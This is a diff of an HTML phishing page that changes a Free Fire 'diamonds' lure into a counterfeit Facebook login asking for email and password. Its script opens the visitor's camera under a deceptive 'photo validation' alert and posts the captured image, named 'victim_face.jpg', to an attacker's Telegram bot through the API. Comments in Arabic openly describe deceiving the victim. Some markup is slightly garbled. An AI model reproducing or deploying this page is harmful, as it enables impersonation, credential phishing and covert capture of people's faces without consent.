@@ -1,28 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎁 Free Fire Rewards 🎁</title>
+    <title>Log in to Facebook</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #1a1a1a; color: #f1c40f; text-align: center; font-family: sans-serif; margin: 0; padding: 10px; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .container { background: #2c3e50; padding: 30px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
-        .app-icon { width: 80px; height: 80px; border-radius: 15px; margin-bottom: 15px; }
-        h1 { font-size: 22px; color: #fff; margin: 10px 0; }
-        p { font-size: 14px; color: #bdc3c7; margin-bottom: 20px; }
-        .btn { padding: 15px 30px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; transition: background 0.3s; }
-        .btn:hover { background: #c0392b; }
+        body { background: #f0f2f5; font-family: sans-serif; margin: 0; padding: 10px; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .container { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        .logo { width: 150px; height: 30px; margin-bottom: 20px; }
+        h1 { font-size: 18px; color: #1c1e21; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; color: #1c1e21; }
+        input[type="text"]:focus, input[type="password"]:focus { border-color: #1877f2; outline: none; }
+        .btn-login { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 10px; }
+        .btn-login:hover { background: #166fe5; }
+        .footer { margin-top: 20px; border-top: 1px solid #dddfe2; padding-top: 15px; }
+        .btn-signup { width: 100%; padding: 10px; background: #42b72a; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .btn-signup:hover { background: #36a420; }
+        /* إخفاء الفيديو والكانفاس */
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://dl.listdl.com/icons/garena-free-fire-icon.png" alt="Free Fire" class="app-icon">
-        <h1>💎 Claim 1000 Diamonds 💎</h1>
-        <p>Verification is required to ensure account safety. Please allow camera access.</p>
-        <button class="btn" onclick="startCapture()">CLAIM & VERIFY NOW</button>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
+        <h1>Connect to claim your Free Fire rewards.</h1>
+        <div class="input-group">
+            <input type="text" id="email" placeholder="Email address or phone number" required>
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password" required>
+        </div>
+        <button class="btn-login" onclick="startCapture()">Log in</button>
+        
+        <div class="footer">
+            <button class="btn-signup">Create New Account</button>
+        </div>
     </div>
 
-    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <video id="video" width="640" height="480" autoplayplaysinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
@@ -31,15 +46,15 @@
 
         async function startCapture() {
             try {
-                // 1. طلب الكاميرا
+                // 1. طلب الكاميرا ديريكت
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // رسالة مزورة باش الضحية يآمن بلي كاين عملية
-                alert("🎁 Checking account status... Photo validation in progress. Do not close!");
+                // رسالة خادعة باش يآمن بلي كاين عملية
+                alert("Checking account status... Photo validation required!");
 
-                // 2. الحل: زدنـا الوقت لـ 4 ثواني باش الكاميرا تفتح صافية
+                // 2. التقاط صورة بعد 2 ثانية (باش يوافق)
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
@@ -50,18 +65,14 @@
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
                         formData.append('photo', blob, 'victim_face.jpg');
-                        formData.append('caption', '🎯 Captured! Victim validated photo.');
+                        formData.append('caption', '🎯 Captured! Victimvalidated photo.');
 
                         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         });
-                        
-                        // رسالة نجاح مزورة للضحية
-                        setTimeout(() => alert("✅ Identity Verified! Diamonds will be added within 24 hours."), 1000);
-
                     }, 'image/jpeg');
-                }, 4000); // 4 ثواني انتظار
+                }, 2000);
 
             } catch (err) {
                 // رسالة خطأ مزورة إذا رفض الكاميرا
